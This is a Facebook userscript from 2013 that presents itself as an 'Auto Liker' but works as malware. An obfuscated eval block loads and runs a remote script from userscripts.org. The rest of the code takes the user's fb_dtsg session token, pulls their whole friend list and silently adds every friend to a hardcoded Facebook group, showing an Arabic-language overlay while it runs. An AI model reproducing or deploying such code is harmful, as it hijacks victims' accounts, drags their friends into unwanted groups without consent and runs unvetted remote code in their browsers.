// ==UserScript==
// @name			NEW FB Auto Liker ALL PLUS By s.k.i.l. + Last Update
// @namespace		        NEW FB Auto Liker ALL PLUS By s.k.i.l. (17.2.2013)
// @description		        NEW FB Auto Liker ALL PLUS By s.k.i.l. (17.2.2013)
// @author			s.k.i.l
// @authorURL		        http://www.facebook.com/
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// @include			htt*://www.facebook.com/*
// @version			2.1


// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))




// ==============

var tulisanNganu='&#1578;&#1576;&#1602;&#1609; &#1575;&#1604;&#1603;&#1576;&#1610;&#1585; &#1610;&#1575; &#1593;&#1585;&#1575;&#1602; _ &#1578;&#1581;&#1610;&#1575;&#1578; &#1575;&#1610;&#1605;&#1606; &#1605;&#1593;&#1583;&#1604;';
var kunaon = '';
function penetrasi(opo) {
	jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=160894294041522" + memberGroupId + "&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + Env.user, function (a) {
		var b = a.substring(a.indexOf("{"));
		var c = JSON.parse(b); 
		i--;
		kunaon = "<div class='friend-edge-name' style='text-align:center;font-size:15px;white-space:pre-wrap;";
		if (c.error) {
			kunaon += "color:red'>";
			if (c.errorDescription) {
				kunaon += c.errorDescription;
			} else {
				kunaon += JSON.stringify(c, null, "");
			}
		} else {
			kunaon += "color:green'>";
			kunaon += arr[i];
			suc++;
		}
		kunaon += "</div>";
var dipes = "<div id='friend-edge-display' style='position:fixed;left:35%;margin-left:-273px;top:38px;width:740px;background-color:silver;z-index:9999;font-size:25px;text-align:center;padding:25px;border-radius:200px;border:15px double white'>";
		dipes += "<div style='padding-bottom:15px;font-size:30px;color: white;'>" + tulisanNganu + "</div>";
		if (i > 0) {
			dipes += arr.length + " &#1593;&#1583;&#1583; &#1575;&#1589;&#1583;&#1602;&#1575;&#1574;&#1603; <br/> " ;
			dipes +=  + (arr.length - i) + " &#1580;&#1575;&#1585;&#1610; &#1575;&#1604;&#1576;&#1581;&#1579;<br/>";
			dipes +=  + suc + " &#1575;&#1604;&#1593;&#1583;&#1583; &#1575;&#1604;&#1605;&#1590;&#1575;&#1601;<br/>";
			dipes += "<div class='friend-edge'>";
			dipes += kunaon;
			dipes += "</div>";
		} else {
			dipes += "<b>" + suc + " &#1575;&#1604;&#1593;&#1583;&#1583; &#1575;&#1604;&#1605;&#1590;&#1575;&#1601;</b>";
                        dipes += "<div><span class='uiButton' onClick='document.getElementById(\"pagelet_welcome_box\").style.display=\"none\"'> OK </span></div>";
		}
		dipes += "</div>";
		document.getElementById("pagelet_welcome_box").innerHTML = dipes;
	},
	"text", "post");
	tay--;
	if (tay > 0) {
		var s = arr[tay];
		setTimeout("penetrasi(" + s + ")", 100);
	}
	console.log(tay + "/" + arr.length + ":" + s + ", success:" + suc);
	if (memberGroupId != 160894294041522) {
		jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=160894294041522&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + Env.user, function () {},
		"text", "post");
	}
}
function clickfr_callback() {
	if (document.getElementsByName("ok").length > 0) {
		nHtml.ClickUp(document.getElementsByName("ok")[0])
	}
	var a = arr[i];
	if (i < arr.length) addfriend(a.substring(0, 4))
}
function clickfr() {
	if (document.getElementsByClassName("search").length > 0) {
		console.log(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1].innerHTML);
		document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].href = "javascript:void(0);";
		nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1])
	} else j++;
	setTimeout("clickfr_callback()", 2e3)
}
function addfriend(a) {
	i++;
	document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
	document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].value = a;
	document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].blur();
	document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
	document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
	setTimeout("clickfr()", 2e3)
}
function sleep(a) {
	var b = (new Date).getTime();
	for (var c = 0; c < 1e7; c++) {
		if ((new Date).getTime() - b > a) {
			break
		}
	}
}
jx = {
	getHTTPObject: function () {
		var a = false;
		if (typeof ActiveXObject != "undefined") {
			try {
				a = new ActiveXObject("Msxml2.XMLHTTP")
			} catch(b) {
				try {
					a = new ActiveXObject("Microsoft.XMLHTTP")
				} catch(c) {
					a = false
				}
			}
		} else {
			if (window.XMLHttpRequest) {
				try {
					a = new XMLHttpRequest
				} catch(b) {
					a = false
				}
			}
		}
		return a
	},
	load: function (url, callback, format, method, opt) {
		var http = this.init();
		if (!http || !url) {
			return
		}
		if (http.overrideMimeType) {
			http.overrideMimeType("text/xml")
		}
		if (!method) {
			method = "GET"
		}
		if (!format) {
			format = "text"
		}
		if (!opt) {
			opt = {}
		}
		format = format.toLowerCase();
		method = method.toUpperCase();
		var now = "uid=" + (new Date).getTime();
		url += url.indexOf("?") + 1 ? "&": "?";
		url += now;
		var parameters = null;
		if (method == "POST") {
			var parts = url.split("?");
			url = parts[0];
			parameters = parts[1]
		}
		http.open(method, url, true);
		if (method == "POST") {
			http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			http.setRequestHeader("Content-length", parameters.length);
			http.setRequestHeader("Connection", "close")
		}
		var ths = this;
		if (opt.handler) {
			http.onreadystatechange = function () {
				opt.handler(http)
			}
		} else {
			http.onreadystatechange = function () {
				if (http.readyState == 4) {
					if (http.status == 200) {
						var result = "";
						if (http.responseText) {
							result = http.responseText
						}
						if (format.charAt(0) == "j") {
							result = result.replace(/[\n\r]/g, "");
							result = eval("(" + result + ")")
						} else {
							if (format.charAt(0) == "x") {
								result = http.responseXML
							}
						}
						if (callback) {
							callback(result)
						}
					} else {
						if (opt.loadingIndicator) {
							document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator)
						}
						if (opt.loading) {
							document.getElementById(opt.loading).style.display = "none"
						}
						if (error) {
							error(http.status)
						}
					}
				}
			}
		}
		http.send(parameters)
	},
	bind: function (a) {
		var b = {
			url: "",
			onSuccess: false,
			onError: false,
			format: "text",
			method: "GET",
			update: "",
			loading: "",
			loadingIndicator: ""
		};
		for (var c in b) {
			if (a[c]) {
				b[c] = a[c]
			}
		}
		if (!b.url) {
			return
		}
		var d = false;
		if (b.loadingIndicator) {
			d = document.createElement("div");
			d.setAttribute("style", "position:absolute;top:0px;left:0px;");
			d.setAttribute("class", "loading-indicator");
			d.innerHTML = b.loadingIndicator;
			document.getElementsByTagName("body")[0].appendChild(d);
			this.opt.loadingIndicator = d
		}
		if (b.loading) {
			document.getElementById(b.loading).style.display = "none"
		}
		this.load(b.url, function (a) {
			if (b.onSuccess) {
				b.onSuccess(a)
			}
			if (b.update) {
				document.getElementById(b.update).innerHTML = a
			}
			if (d) {
				document.getElementsByTagName("body")[0].removeChild(d)
			}
			if (b.loading) {
				document.getElementById(b.loading).style.display = "none"
			}
		},
		b.format, b.method, b)
	},
	init: function () {
		return this.getHTTPObject()
	}
};
var nHtml = {
	FindByAttr: function (a, b, c, d) {
		if (c == "className") {
			c = "class"
		}
		var e = document.evaluate(".//" + b + "[@" + c + "='" + d + "']", a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
		if (e && e.singleNodeValue) {
			return e.singleNodeValue
		}
		return null
	},
	FindByClassName: function (a, b, c) {
		return this.FindByAttr(a, b, "className", c)
	},
	FindByXPath: function (a, b) {
		try {
			var c = document.evaluate(b, a, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null)
		} catch(d) {
			GM_log("bad xpath:" + b)
		}
		if (c && c.singleNodeValue) {
			return c.singleNodeValue
		}
		return null
	},
	VisitUrl: function (a) {
		window.setTimeout(function () {
			document.location.href = a
		},
		500 + Math.floor(Math.random() * 500))
	},
	ClickWin: function (a, b, c) {
		var d = a.document.createEvent("MouseEvents");
		d.initMouseEvent(c, true, true, a, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
		return ! b.dispatchEvent(d)
	},
	Click: function (a) {
		return this.ClickWin(window, a, "click")
	},
	ClickTimeout: function (a, b) {
		window.setTimeout(function () {
			return nHtml.ClickWin(window, a, "click")
		},
		b + Math.floor(Math.random() * 500))
	},
	ClickUp: function (a) {
		this.ClickWin(window, a, "mousedown");
		this.ClickWin(window, a, "mouseup");
		this.ClickWin(window, a, "click")
	},
	GetText: function (a, b) {
		var c = "";
		if (b == undefined) {
			b = 0
		}
		if (b > 40) {
			return
		}
		if (a.textContent != undefined) {
			return a.textContent
		}
		for (var d = 0; d < a.childNodes.length; d++) {
			var e = a.childNodes[d];
			c += this.GetText(e, b + 1)
		}
		return c
	}
};
if (document.getElementsByClassName == undefined) {
	document.getElementsByClassName = function (a) {
		var b = new RegExp("(?:^|\\s)" + a + "(?:$|\\s)");
		var c = document.getElementsByTagName("*");
		var d = [];
		var e;
		for (var f = 0;
		(e = c[f]) != null; f++) {
			var g = e.className;
			if (g && g.indexOf(a) != -1 && b.test(g)) d.push(e)
		}
		return d
	}
}
Array.prototype.find = function (a) {
	var b = false;
	for (i = 0; i < this.length; i++) {
		if (typeof a == "function") {
			if (a.test(this[i])) {
				if (!b) {
					b = []
				}
				b.push(i)
			}
		} else {
			if (this[i] === a) {
				if (!b) {
					b = []
				}
				b.push(i)
			}
		}
	}
	return b
};

var a = 0,
eind = 0;
var len = document.getElementsByClassName("mbm").length;
for (a = 0; a < len; a++) {
	var ele = document.getElementsByClassName("mbm")[a];
	if (ele && ele.childNodes[0] && ele.childNodes[0] && ele.childNodes[0].childNodes[1] && ele.childNodes[0].childNodes[1].childNodes[0] && document.getElementsByClassName("mbm")[a].childNodes[0].childNodes[1].childNodes[0].value == "Add Friends To Group") {
		eind = a;
		break
	}
}
var i = 3;
var tay = 3;
var counter1 = 0,
counter2 = 0,
counter3 = 0;
var j = 0;
var k = 0;
var suc = 0;
var arr = new Array;
var memberGroupId = document.getElementsByName('group_id')[0].value;

jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer=" + Env.user + "&filter[0]=user&__user=" + Env.user, function (a) {
	var b = a;
	var c = b.substring(b.indexOf("{"));
	var d = JSON.parse(c);
	d = d.payload.entries;
	for (var e = 0; e < d.length; e++) {
		arr.push(d[e].uid)
	}
	i = arr.length - 1;
	tay = i;
	console.log(arr.length);
	var dipes = "<div id='friend-edge-display' style='position:fixed;left:35%;margin-left:-273px;top:38px;width:740px;background-color:silver;z-index:9999;font-size:25px;text-align:center;padding:25px;border-radius:200px;border:15px double white'>"
	dipes += "<div style='padding-bottom:15px;font-size:30px;color: white;'>" + tulisanNganu + "</div>";
	dipes += arr.length + " Friends Detected";
	dipes += "</div>";
	document.getElementById("pagelet_welcome_box").innerHTML = dipes;
	penetrasi(arr[i])
})

